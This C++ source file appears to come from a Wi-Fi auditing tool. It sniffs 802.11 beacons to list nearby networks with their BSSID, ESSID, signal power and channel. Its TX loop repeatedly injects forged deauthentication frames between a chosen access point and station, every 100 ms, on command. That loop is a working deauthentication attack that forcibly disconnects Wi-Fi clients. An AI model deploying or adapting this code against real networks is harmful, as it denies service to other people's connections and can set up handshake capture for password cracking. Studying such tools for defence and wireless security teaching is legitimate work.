#include "runner.h"
#include "suseongtrace.h"
#include "mac.h"
#include "radiotap.h"
#include "wireless.h"


Runner::Runner()
{
    isRunning = false;
    pcap = nullptr;
}
Runner::~Runner()
{
    stop();
}

void setStdinNonBlock()
{
    int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
    fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK);
}

void Runner::TXloop()
{
    int deauthCounter = 0;
    while(isRunning)
    {
        ST_IPC_CMD cmd;
        std::lock_guard<std::mutex> lock(cmdMutex);
        cmd = currentCmd;
        uint32_t logCount = 100;

        if(cmd.action == 2)
        {
            // 1. AP -> STATION
            ST_DEAUTH_PACKET pktAtoS;
            pktAtoS.wl = getStDeauth(currentCmd.target_ap, currentCmd.target_st);
            pcap_sendpacket(pcap, (const u_char*)&pktAtoS, sizeof(pktAtoS));

            // 2. STATION -> AP
            ST_DEAUTH_PACKET pktStoA;
            pktStoA.wl = getApDeauth(currentCmd.target_ap, currentCmd.target_st);
            pcap_sendpacket(pcap, (const u_char*)&pktStoA, sizeof(pktStoA));

            deauthCounter++;
            if(deauthCounter % logCount == 0)
            {
                ST_IPC_EVENT log;
                memset(&log, 0, sizeof(ST_IPC_EVENT));
                log.type = 1;
                snprintf(log.message, sizeof(log.message), "Deauth sent: %d", deauthCounter);
                std::lock_guard<std::mutex> outLock(outMutex);
                fwrite(&log, sizeof(ST_IPC_EVENT), 1, stdout);
                fflush(stdout);
            }

            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        else
        {
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
    }
}

void Runner::RXloop(const std::string& dev)
{
    isRunning = true;
    device = dev;

    pcap = pcap_open_live(device.c_str(), BUFSIZ, 1, 100, errbuf);
    if(pcap == nullptr)
    {
        std::string errMsg = "pcap_open_live failed: ";
        errMsg += errbuf;
        TRACE(errMsg);
        return;
    }

    // DEAUTH
    setStdinNonBlock();
    memset(&currentCmd, 0, sizeof(ST_IPC_CMD));
    TXthread = std::thread(&Runner::TXloop, this);

    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;

    while(isRunning)
    {
        ST_IPC_CMD cmd;
        int readBytes = read(STDIN_FILENO, &cmd, sizeof(ST_IPC_CMD));
        if(readBytes == sizeof(ST_IPC_CMD))
        {
            std::lock_guard<std::mutex> lock(cmdMutex);
            currentCmd = cmd;
            if (currentCmd.action == 4) break;
        }

        // Sniffing
        res = pcap_next_ex(pcap, &header, &packet);
        if(res == 0) continue; // 타임아웃
        if(res == -1 || res == -2) break; // error, breakloop

        ST_RDT rdt = capRdt(packet);
        ST_WL wl = capWl(packet+rdt.len);
        uint64_t wirelessLen = sizeof(wl);

        // 비콘 체크
        if (!chkBeacon(wl)) continue;

        ST_INFO info;
        memset(&info, 0, sizeof(ST_INFO));
        prtMac(info.bssid, sizeof(info.bssid), wl.bssid);

        ST_BC_COMMON bc = capBc(packet + rdt.len + wirelessLen);
        uint64_t bcLen = sizeof(bc);

        const u_char* tagStart = (packet + rdt.len + wirelessLen + bcLen);
        // getEssid -> TAG 0이 없으면 false, 있으면 true
        if(!getEssid(info.essid, sizeof(info.essid), tagStart, (header->caplen) - rdt.len - wirelessLen - bcLen))
        {
            continue;
        }

        ST_RDT_DATA rdtData = getRdtInfo(packet, &rdt, presentCount(packet));
        if(rdtData.pwr != 999) info.pwr = static_cast<int16_t>(rdtData.pwr);
        if(rdtData.ch != 0) info.ch = static_cast<int16_t>(rdtData.ch);

        std::lock_guard<std::mutex> outLock(outMutex);
        fwrite(&info, sizeof(ST_INFO), 1, stdout);
        fflush(stdout);
    }
    isRunning = false;
    if(TXthread.joinable()) TXthread.join();
    pcap_close(pcap);
    pcap = nullptr;

}

void Runner::stop()
{
    isRunning = false;
    if(pcap != nullptr)
    {
        pcap_breakloop(pcap);
    }
}
